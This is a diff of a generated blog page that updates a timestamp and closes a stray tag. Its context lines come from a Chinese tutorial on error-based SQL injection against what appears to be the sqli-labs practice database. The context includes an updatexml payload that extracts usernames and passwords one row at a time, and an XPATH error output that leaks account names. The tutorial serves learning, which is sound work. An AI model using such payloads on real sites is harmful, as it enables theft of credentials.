@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1672921145135),
+    lastupdate: new Date(1673099008970),
     sidebar: {
       for_page: ["blogger","category","tagcloud","text"],
       for_post: ["toc"],
@@ -2776,7 +2776,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <blockquote>
 <p>XPATH syntax error: ‘~~Dumb,Angelina,Dummy,secure,stu’</p>
 </blockquote>
-<p>很明显可以看出username没有完全爆出，这里数了一下’’里的内容确实只有32位<br>证明我的想法可能是对的’<doge>‘<br>好了，回归正题</p>
+<p>很明显可以看出username没有完全爆出，这里数了一下’’里的内容确实只有32位<br>证明我的想法可能是对的’<doge>‘<br>好了，回归正题</doge></p>
 <h2 id="获取所有username和password"><a href="#获取所有username和password" class="headerlink" title="获取所有username和password"></a>获取所有username和password</h2><p>既然上面验证了updatexml和group_concat同时使用可能会发生的事情，这里就不会“误入歧途”了<br>直接用limit依次获取所有的username和password</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and updatexml(1,concat(0x7e,(select (select concat(username,0x7e,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
